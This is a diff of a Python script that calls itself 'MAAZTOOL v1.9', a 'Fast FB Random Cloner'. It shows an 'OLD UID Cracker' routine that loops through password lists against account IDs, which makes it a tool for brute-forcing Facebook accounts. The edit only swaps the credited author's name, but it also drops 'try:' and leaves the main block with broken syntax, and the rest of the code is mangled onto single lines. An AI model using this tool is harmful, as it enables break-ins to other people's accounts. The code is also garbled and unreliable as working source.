@@ -1,4 +1,4 @@
-#=====[🌿] DEVELOPER: MAAZTOOL OFFICIAL VERSION v1.9 #=====[🌿] BASE LOGIC BY: UMAIR KING / MUNNA (RESPECT) #=====[🌿] ALL RIGHTS PRESERVED BY @MAAZTOOL v1.9
+#=====[🌿] DEVELOPER: MAAZTOOL OFFICIAL VERSION v1.9 #=====[🌿] BASE LOGIC BY: Asad Nazeer/ MUNNA (RESPECT) #=====[🌿] ALL RIGHTS PRESERVED BY @MAAZTOOL v1.9
 
 import os import sys import json import uuid import string import random import requests from time import sleep from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
@@ -37,5 +37,5 @@ def start_crack(uid, passwords): global loop for pw in passwords: login(uid, pw)
 
 def main(): os.system("clear") print(f"""{G} ╔═══════════════════════════════════╗ ║         {Y}MAAZTOOL v1.9 FINAL BUILD        {G}║ ║         FAST FB RANDOM CLONER         ║ ╚═══════════════════════════════════╝{N}") print("\n1. Start OLD UID Cracker (Auto)") print("0. Exit\n") opt = input(f"{Y}SELECT OPTION ➤ {G}") if opt == "1": old_uid_cracker() else: exit()
 
-if name == "main": try: main() except KeyboardInterrupt: print(f"\n{R}Exit by user.{N}")
+if name == "main": Asad Nazeer: main() except KeyboardInterrupt: print(f"\n{R}Exit by Asad Nazeer.{N}")
 
